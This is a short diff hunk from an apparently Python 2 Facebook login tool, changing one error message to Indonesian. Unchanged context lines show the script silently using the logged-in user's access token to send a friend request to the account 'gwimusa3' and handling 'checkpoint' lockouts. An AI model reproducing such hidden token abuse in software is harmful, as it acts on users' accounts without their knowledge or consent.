@@ -174,7 +174,7 @@ def login():
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\x1b[1;91mThere is no internet connection"
+				print"\n\x1b[1;91mTIDAK ADA KONEKSI"
 				keluar()
 		if 'checkpoint' in url:
 			print("\n\x1b[1;93mYour Account is on Checkpoint")
